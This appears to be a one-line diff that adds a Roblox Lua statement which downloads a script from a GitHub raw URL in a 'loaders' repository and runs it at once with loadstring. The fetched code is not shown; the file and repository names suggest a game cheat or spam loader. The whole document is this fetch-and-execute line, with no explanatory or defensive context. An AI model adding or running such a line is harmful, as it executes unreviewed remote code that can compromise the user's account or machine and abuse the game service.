@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/upd-8-cvr-retro-spam4-pib6596rl62jr4.lua"))()
